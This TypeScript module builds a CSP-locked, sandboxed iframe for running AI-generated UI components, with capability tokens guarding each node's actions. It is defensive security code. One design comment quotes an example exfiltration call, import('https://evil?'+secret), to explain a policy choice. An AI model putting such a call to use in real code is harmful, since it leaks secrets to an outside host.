import type { ActionRequest, ActionResult, UINode } from "@flowlet/core";
import type { MessageEndpoint } from "./protocol";
import { makeRpc } from "./bridge";
import { STAGE_RUNTIME_SRC } from "./runtime";

// ── CSP ──────────────────────────────────────────────────────────────────────

const CSP_BASE = [
  "default-src 'none'",
  // script-src is built per-call with a nonce (see buildSrcdoc)
  "style-src 'unsafe-inline'",
  "img-src data:",
  "font-src data:",
  "connect-src 'none'",
].join("; ");

// ── buildSrcdoc ───────────────────────────────────────────────────────────────

/**
 * Pure: returns the srcdoc HTML for the sandboxed iframe.
 *
 * When `reactRuntimeSrc` is provided the srcdoc includes a synchronous
 * (non-module) bootstrap script that runs *before* the deferred module
 * runtime.  It:
 *   1. Creates a blob: URL from the React shim source.
 *   2. Records it as `window.__FLOWLET_REACT_URL` for the runtime.
 *   3. Injects `<script type="importmap">` mapping "react", "react-dom",
 *      "react-dom/client", and "react/jsx-runtime" to that blob URL.
 *
 * Because non-module scripts execute synchronously during parsing and module
 * scripts are deferred until after parsing, the import map is guaranteed to be
 * in place before the module runtime executes its first `import()`.
 *
 * Without `reactRuntimeSrc` the original self-contained bundle path is used
 * unchanged (the bundle ships its own React and sets window.__React).
 */
export function buildSrcdoc(reactRuntimeSrc?: string): string {
  const nonce = crypto.randomUUID().replace(/-/g, "");
  // No 'strict-dynamic': it lets trusted scripts dynamically load ANY script
  // URL (allowlists are ignored), which is a data-exfil channel once generated
  // (AI-written) code runs in the realm — import("https://evil?"+secret).
  // All legitimate loading (React shim, host bundle, generated modules) is
  // blob-URL import(), which the explicit blob: source keeps working. The
  // dynamically created importmap script below carries its own nonce because
  // strict-dynamic no longer propagates trust to inserted scripts.
  const csp = `script-src 'nonce-${nonce}' blob:; ${CSP_BASE}`;

  let reactSetupScript = "";
  if (reactRuntimeSrc) {
    // Embed the shim source as a JSON string literal safe for inline HTML.
    // Escape < so "</script>" cannot appear inside the <script> body.
    const safeJson = JSON.stringify(reactRuntimeSrc).replace(/</g, "\\u003c");
    reactSetupScript =
      `<script nonce="${nonce}">` +
      `(function(){` +
      `var _s=${safeJson};` +
      `var _u=URL.createObjectURL(new Blob([_s],{type:"text/javascript"}));` +
      `window.__FLOWLET_REACT_URL=_u;` +
      `var _im=document.createElement('script');` +
      `_im.type='importmap';` +
      // Without 'strict-dynamic' this inserted script needs its own nonce.
      // Escaped for parity with safeJson (the nonce is hex so this is a no-op).
      `_im.nonce=${JSON.stringify(nonce).replace(/</g, "\\u003c")};` +
      `_im.textContent=JSON.stringify({imports:{` +
      `"react":_u,` +
      `"react-dom":_u,` +
      `"react-dom/client":_u,` +
      `"react/jsx-runtime":_u` +
      `}});` +
      `document.head.appendChild(_im);` +
      // Eagerly import the shim so its module is registered+evaluated, then revoke
      // the blob URL. Later bare "react" imports resolve via the import map to the
      // already-cached module, so revocation does not break them.
      `import(_u).then(function(){URL.revokeObjectURL(_u);}).catch(function(){});` +
      `})();` +
      `<\/script>`;
  }
  return (
    `<!doctype html><html lang="en"><head>` +
    `<meta http-equiv="Content-Security-Policy" content="${csp}">` +
    `<title>Flowlet Stage</title>` +
    `</head><body>${reactSetupScript}` +
    `<script type="module" nonce="${nonce}">${STAGE_RUNTIME_SRC}<\/script>` +
    `</body></html>`
  );
}

// ── Endpoint pair ─────────────────────────────────────────────────────────────

export interface StageEndpoints {
  /** Endpoint the host listens on for messages from the runtime. */
  listen: MessageEndpoint;
  /** Endpoint the host posts to; the runtime receives messages here. */
  post: MessageEndpoint;
}

// ── createStage (DOM-only, tested via browser suite) ─────────────────────────

/**
 * Creates and mounts a sandboxed iframe.
 * Returns the iframe and the endpoint pair needed by `connectStage`.
 *
 * `opts.reactSource` — if provided, the React shim source is embedded in the
 * srcdoc and an import map is set up so externalized host bundles share one
 * React instance. When omitted the self-contained bundle path is used.
 */
export function createStage(
  slot: HTMLElement,
  opts?: { reactSource?: string },
): {
  iframe: HTMLIFrameElement;
  endpoints: StageEndpoints;
} {
  const iframe = document.createElement("iframe");
  iframe.id = "flowlet-stage";
  iframe.title = "Flowlet stage";
  iframe.setAttribute("sandbox", "allow-scripts"); // no allow-same-origin → opaque origin
  iframe.srcdoc = buildSrcdoc(opts?.reactSource);
  iframe.style.cssText = "width:100%;min-height:1px;border:0;";
  slot.appendChild(iframe);

  // Auto-size: the runtime posts { flowlet:true, type:"resize", height } from a
  // ResizeObserver on its documentElement; consume it here so the iframe tracks
  // its content instead of clipping at the UA default height. Lives in
  // createStage (the DOM layer) rather than connectStage, which is DOM-free.
  // Self-cleaning: once the iframe is removed from the document the next
  // message drops the listener.
  const onResize = (e: MessageEvent) => {
    if (!iframe.isConnected) {
      window.removeEventListener("message", onResize);
      return;
    }
    if (e.source !== iframe.contentWindow) return;
    const d = e.data as { flowlet?: boolean; type?: string; height?: number } | undefined;
    if (d?.flowlet === true && d.type === "resize" && typeof d.height === "number") {
      iframe.style.height = `${d.height}px`;
    }
  };
  window.addEventListener("message", onResize);

  // Wrap contentWindow.postMessage to supply the required targetOrigin ("*").
  // The MessageEndpoint interface only takes one argument, but the browser's
  // Window.postMessage requires targetOrigin — without it Chrome throws.
  const postEndpoint: MessageEndpoint = {
    postMessage: (msg) => iframe.contentWindow!.postMessage(msg, "*"),
    addEventListener: () => {},
    removeEventListener: () => {},
  };

  // Source-filtered listen: only forward messages from this iframe's contentWindow.
  // NOTE: srcdoc iframes are opaque-origin so e.origin === "null" — do NOT use origin;
  // e.source identity is the reliable guard.
  const registeredHandlers = new Map<
    (e: { data: unknown }) => void,
    (e: MessageEvent) => void
  >();
  const listenEndpoint: MessageEndpoint = {
    postMessage: () => {},
    addEventListener(_type, handler) {
      const wrapped = (e: MessageEvent) => {
        if (e.source !== iframe.contentWindow) return;
        if (!e.data || (e.data as Record<string, unknown>).flowlet !== true) return;
        handler({ data: e.data });
      };
      registeredHandlers.set(handler, wrapped);
      window.addEventListener("message", wrapped);
    },
    removeEventListener(_type, handler) {
      const wrapped = registeredHandlers.get(handler);
      if (wrapped) {
        window.removeEventListener("message", wrapped);
        registeredHandlers.delete(handler);
      }
    },
  };

  return {
    iframe,
    endpoints: {
      listen: listenEndpoint,
      post: postEndpoint,
    },
  };
}

// ── Types ─────────────────────────────────────────────────────────────────────

/** Payload for `controller.initialize()`. */
export interface StageInitPayload {
  theme: Record<string, string>;
  state: Record<string, unknown>;
  bundleSource: string;
  tree: UINode;
  /** Tier 2.5: name → ESM component source, loaded as blob modules in-sandbox. */
  generatedComponents?: Record<string, string>;
  /**
   * Opaque theme blob for the in-sandbox component library (OpenUI). Forwarded
   * unchanged into `ui/initialize`; the runtime hands it to the host bundle's
   * `__FLOWLET_THEME_WRAP__` without ever inspecting its shape. Typed `unknown`
   * to keep @flowlet/stage decoupled from @flowlet/components/OpenUI.
   */
  componentTheme?: unknown;
}

/** Payload for `controller.update()`. */
export interface StageUpdatePayload {
  theme?: Record<string, string>;
  state?: Record<string, unknown>;
  /**
   * Node patch. `nodeId` and `node` travel as one unit — you cannot pass one
   * without the other (the runtime rejects a partial patch).
   */
  replace?: { nodeId: string; node: UINode };
}

/** Callback the host app provides to handle every validated action. */
export type OnAction = (req: ActionRequest) => Promise<ActionResult | { pending: true }>;

/** Controller returned by `connectStage`. */
export interface StageController {
  /**
   * Resolves when the runtime posts its `{ flowlet:true, type:"ready" }`
   * notification, or rejects with a `sandbox` error if it never arrives within
   * the ready timeout.
   */
  ready: Promise<void>;
  initialize(payload: StageInitPayload): Promise<unknown>;
  update(update: StageUpdatePayload): Promise<unknown>;
  /** Resolve a parked approval-pending action with a successful result. */
  resolveAction(actionId: string, result: ActionResult): void;
  /**
   * Cancel a parked approval-pending action: settles the runtime-side promise
   * with an error so it never leaks, and drops the id from the pending set.
   */
  cancelAction(actionId: string, reason?: string): void;
  dispose(): void;
}

// ── Capability helpers ────────────────────────────────────────────────────────

type NodeLike = { id: string; children?: NodeLike[] } & Record<string, unknown>;

function mintToken(): string {
  return `cap-${crypto.randomUUID()}`;
}

function mintActionId(): string {
  return `act-${crypto.randomUUID()}`;
}

function mintRequestId(): string {
  return `req-${crypto.randomUUID()}`;
}

/**
 * Walks the tree recursively, minting a unique capability token per node id
 * and attaching it as `capability` on each node. Returns the augmented tree.
 */
function attachCapabilities(node: NodeLike, map: Map<string, string>): NodeLike {
  const token = mintToken();
  map.set(node.id, token);
  const children = Array.isArray(node.children)
    ? node.children.map((c) => attachCapabilities(c, map))
    : undefined;
  return { ...node, capability: token, ...(children !== undefined ? { children } : {}) };
}

/**
 * Walks an already-augmented tree and (re)builds the id → token map by reading
 * each node's existing `capability`. Mirrors the runtime's buildCapabilityMap so
 * only live node ids retain tokens. Does NOT mint new tokens.
 */
function collectCapabilities(node: NodeLike | null, map: Map<string, string>): void {
  if (!node) return;
  const cap = (node as Record<string, unknown>).capability;
  if (node.id && typeof cap === "string") map.set(node.id, cap);
  if (Array.isArray(node.children)) node.children.forEach((c) => collectCapabilities(c, map));
}

/** Recursive find-and-replace by id (host mirror of the runtime helper). */
function replaceNode(node: NodeLike | null, targetId: string, newNode: NodeLike): NodeLike | null {
  if (!node) return node;
  if (node.id === targetId) return newNode;
  if (!Array.isArray(node.children) || node.children.length === 0) return node;
  return { ...node, children: node.children.map((c) => replaceNode(c, targetId, newNode) as NodeLike) };
}

// ── connectStage ──────────────────────────────────────────────────────────────

/**
 * The testable core: wires the RPC bridge and exposes the `StageController`.
 * Does not touch the real DOM or `window` — only uses `MessageEndpoint`s.
 */
export function connectStage(
  endpoints: StageEndpoints,
  { onAction, readyTimeoutMs = 10_000 }: { onAction: OnAction; readyTimeoutMs?: number },
): StageController {
  const capabilityMap = new Map<string, string>();
  const pendingActionIds = new Set<string>();
  // Host-side copy of the (capability-augmented) current tree. Used to rebuild
  // the capability map from scratch on every initialize/update so stale tokens
  // for removed/replaced node ids never linger.
  let currentTree: NodeLike | null = null;

  // ready: resolves when the runtime posts { flowlet:true, type:"ready" }, or
  // rejects with a sandbox error if it never arrives. This is NOT an RPC call —
  // it's a one-way notification, so we handle it with a dedicated listener.
  let resolveReady!: () => void;
  let rejectReady!: (e: Error) => void;
  let readySettled = false;
  const ready = new Promise<void>((res, rej) => { resolveReady = res; rejectReady = rej; });
  const readyTimer = setTimeout(() => {
    if (readySettled) return;
    readySettled = true;
    rejectReady(Object.assign(new Error("stage did not become ready in time"), { code: "sandbox" }));
  }, readyTimeoutMs);
  const readyHandler = (e: { data: unknown }) => {
    const d = e.data as Record<string, unknown>;
    if (d?.flowlet === true && d?.type === "ready") {
      if (readySettled) return;
      readySettled = true;
      clearTimeout(readyTimer);
      resolveReady();
    }
  };
  endpoints.listen.addEventListener("message", readyHandler);

  const rpc = makeRpc(endpoints.listen, endpoints.post, async (method, params) => {
    if (method === "tools/call") {
      const p = params as {
        name: string;
        originNodeId: string;
        capability: unknown;
        payload?: unknown;
      };

      // Capability chokepoint: unknown node or wrong token → bridge error
      const expectedToken = capabilityMap.get(p.originNodeId);
      if (!expectedToken || expectedToken !== p.capability) {
        throw new Error(`capability mismatch for node "${p.originNodeId}"`);
      }

      // Map to F1 ActionRequest
      const req: ActionRequest = {
        requestId: mintRequestId(),
        originNodeId: p.originNodeId,
        action: p.name,
        payload: p.payload,
        capability: p.capability,
      };

      const outcome = await onAction(req);

      // Approval-pending: defer resolution; runtime waits for ui/action-result
      if ("pending" in outcome && outcome.pending === true) {
        const actionId = mintActionId();
        pendingActionIds.add(actionId);
        return { status: "pending", actionId };
      }

      return outcome;
    }

    throw new Error(`unknown method: ${method}`);
  });

  return {
    ready,

    initialize(payload) {
      // Fresh tree → clear the map, then mint tokens for exactly this tree.
      capabilityMap.clear();
      const augmentedTree = attachCapabilities(payload.tree as unknown as NodeLike, capabilityMap);
      currentTree = augmentedTree;
      return rpc.call("ui/initialize", { ...payload, tree: augmentedTree });
    },

    update(update) {
      const payload: { theme?: Record<string, string>; state?: Record<string, unknown>; replace?: { nodeId: string; node: UINode } } = {};
      if (update.theme) payload.theme = update.theme;
      if (update.state) payload.state = update.state;
      if (update.replace) {
        const { nodeId, node } = update.replace;
        // Mint fresh tokens for the replacement subtree, splice it into our tree
        // copy, then rebuild the whole map from the resulting tree so that only
        // live node ids retain tokens (replaced descendants are dropped).
        const augmentedNode = attachCapabilities(node as unknown as NodeLike, new Map());
        currentTree = replaceNode(currentTree, nodeId, augmentedNode);
        capabilityMap.clear();
        collectCapabilities(currentTree, capabilityMap);
        payload.replace = { nodeId, node: augmentedNode as unknown as UINode };
      }
      return rpc.call("ui/update", payload);
    },

    resolveAction(actionId, result) {
      if (!pendingActionIds.has(actionId)) {
        throw new Error(`resolveAction: unknown actionId "${actionId}"`);
      }
      pendingActionIds.delete(actionId);
      // Post the notification directly (not via RPC — no response expected).
      // The runtime's message listener catches method === "ui/action-result".
      endpoints.post.postMessage({
        flowlet: true,
        method: "ui/action-result",
        params: { actionId, result },
      });
    },

    cancelAction(actionId, reason) {
      // Tolerant: a cancel that races a resolve is a harmless no-op.
      if (!pendingActionIds.has(actionId)) return;
      pendingActionIds.delete(actionId);
      // Deliver an error result so the runtime-side promise settles (rejects)
      // instead of leaking forever.
      endpoints.post.postMessage({
        flowlet: true,
        method: "ui/action-result",
        params: { actionId, error: { code: "abort", message: reason ?? "action cancelled" } },
      });
    },

    dispose() {
      clearTimeout(readyTimer);
      endpoints.listen.removeEventListener("message", readyHandler);
      pendingActionIds.clear();
      // Best-effort teardown so the runtime rejects any outstanding approvals.
      try {
        endpoints.post.postMessage({ flowlet: true, method: "ui/teardown" });
      } catch {
        // ignore — endpoint may already be gone
      }
      rpc.dispose();
    },
  };
}
